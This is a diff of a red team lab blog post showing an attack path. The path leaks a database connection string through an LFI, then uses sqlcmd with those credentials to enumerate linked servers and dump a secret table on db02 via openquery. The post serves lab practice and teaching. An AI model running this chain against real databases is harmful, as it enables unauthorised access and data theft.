@@ -2,16 +2,17 @@
 layout: single
 title: "Red Team Scenario Lab - 01"
 excerpt: "Setting up your own Lab to test (and patch) Red Team Scenarios"
-date: 2023-08-12
+date: 2024-08-12
 header:
-  thumb: /assets/images/AWS_cross_account/cross_account_trust.png
-  teaser: /assets/images/AWS_cross_account/cross_account_trust.png
+  thumb: /assets/images/lab01/in_tha_lab.jpg
+  teaser: /assets/images/lab01/in_tha_lab.jpg
   teaser_home_page: true
   classes: wide
 categories:
   - Lab Setup
 tags:
   - Red Team
+  - MSSQL
 ---
 
 ## Red Team Scenario Lab
@@ -213,25 +214,44 @@ If we make these changes, what the heck is the gMSA doing under the hood on `WEB
 - **Extracting Sensitive Configuration Data**:
   Retrieve database connection string from `c:\inetpub\DevIntranet\appsettings.json` via an LFI present in the Document Management page in the Dev Intranet. This file, left insecurely accessible, demonstrates a common security oversight involving sensitive data exposure.
 
-- **Database Exploration**:
-  Utilize the exposed database credentials to connect using a legitimate account. Without escalating privileges or performing SQL injection, list linked servers and dump critical database contents. This demonstrates how legitimate access can be leveraged to achieve significant impacts, reflecting the high stakes involved even with standard user permissions.
+### Database Exploration
 
-  Download `sqlcmd` from [here](https://github.com/microsoft/go-sqlcmd/releases/download/v1.8.0/sqlcmd-windows-amd64.zip).
+Utilize the exposed database credentials to connect using a legitimate account. Without escalating privileges or performing SQL injection, list linked servers and dump critical database contents. This demonstrates how legitimate access can be leveraged to achieve significant impacts, reflecting the high stakes involved even with standard user permissions.
 
-  ```bash
-  sqlcmd -S db01 -U public_db_reader -P 'threewordphrase1!' -W
+Download `sqlcmd` from [here](https://github.com/microsoft/go-sqlcmd/releases/download/v1.8.0/sqlcmd-windows-amd64.zip).
 
+```bash
+# Connect to the database using sqlcmd
+sqlcmd -S db01 -U public_db_reader -P 'threewordphrase1!' -W
 
-SELECT name, database_id FROM sys.databases;
+# List current databases
+SELECT name from sys.databases;
 GO
 
+# List tables in the 'public_research' database
+select * from public_research.information_schema.tables;
+GO
+
+# Query the 'ResearchPapers' table in the 'public_research' database
+select * from public_research.dbo.researchpapers;
+GO
+
+# Check for linked servers as no useful data is present
 SELECT * FROM sys.servers WHERE is_linked = 1;
 GO
 
-EXEC sp_catalogs @server_name = 'db02';
+# Query linked server databases
+SELECT name FROM db02.master.sys.databases;
+GO
+
+# List tables in the specific database on a linked server
+select * from db02._5G_enzyme_experimental.information_schema.tables;
+go
+
+# Query a specific table on a linked server
+SELECT * FROM DB02._5G_enzyme_experimental.dbo.ExperimentalEnzymes;
+GO
 ```
-
-
 
 - Full one-liner to dump secret db: s`qlcmd -S db01 -U public_db_reader -P 'threewordphrase1!' -Q "select * from openquery(db02, 'select * from _5G_enzyme_experimental.dbo.experimentalenzymes');" -W`
 
